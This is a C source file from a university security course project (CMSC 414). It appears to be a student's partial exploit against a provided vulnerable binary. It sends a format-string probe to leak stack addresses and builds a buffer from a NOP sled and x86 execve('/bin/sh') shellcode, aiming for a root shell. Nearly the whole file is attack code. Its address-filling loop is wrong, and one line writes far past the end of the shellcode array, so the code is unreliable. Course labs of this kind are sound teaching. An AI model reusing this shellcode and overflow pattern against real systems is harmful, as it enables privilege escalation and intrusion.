/*
 * CMSC 414, Section 0201
 * Fall 2020
 * Project 1 | task1
 *
 * Build instructions:
 *   We will be building this with the Makefile provided; you may not make
 *   any changes to the Makefile.  You can #include any other standard C
 *   libraries you want in this file, but none that require any compiler
 *   flags that aren't already in the Makefile.
 *
 * Running instructions:
 *   This file generates binary output, which is fed to vulnerable3.x
 *   If successful, it will result in a root shell.
 *
 * Submission instructions:
 *   Submit this file.
 */

#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Note the bigger buffer this time
#define BUFFER_SIZE 512

// We are providing you with shell code
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax         */
    "\x50"                 /* pushl   %eax              */
    "\x68""//sh"           /* pushl   $0x68732f2f       */
    "\x68""/bin"           /* pushl   $0x6e69622f       */
    "\x89\xe3"             /* movl    %esp,%ebx         */
    "\x50"                 /* pushl   %eax              */
    "\x53"                 /* pushl   %ebx              */
    "\x89\xe1"             /* movl    %esp,%ecx         */
    "\x99"                 /* cdql                      */
    "\xb0\x0b"             /* movb    $0x0b,%al         */
    "\xcd\x80"             /* int     $0x80             */
    ;

int main()
{
    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes
    

    fprintf(stderr, "send debug statements to stderr\n");

    /* you may change this string */
    char greeting[128] = "%p %p %p %p %p %p %p %p\n";

    write(STDOUT_FILENO, greeting, sizeof(greeting) - 1);

    /* you may do whatever you want with the response */
    char response[512];
    fgets(response, sizeof(response), stdin);
    fprintf(stderr, "%s\n", response);

    char useful[10];
    strncpy(useful, &response[16],10);

    char *ptr = buffer;
    long *addr = (long*)ptr; /* cast the buffer pointer to long to get the address for shellcode*/

    /* so end part of buffer should have the shell code, and we need to fill everything with the new return address*/
    for (int i = 0; i< 44; i++){
        *(addr++) = buffer[BUFFER_SIZE-sizeof(shellcode)];
    }

    memset(buffer, 0x90, BUFFER_SIZE); /* Initialized to all 0x90, for NOP */ 

    memcpy(buffer+BUFFER_SIZE-sizeof(shellcode),shellcode,sizeof(shellcode)); /*insert the shellcode into main*/

    shellcode[sizeof(buffer)-1]='\0';




    
    // TODO: Populate the buffer here, as you see fit
    write(STDOUT_FILENO, buffer, BUFFER_SIZE);

    return EXIT_SUCCESS;
}
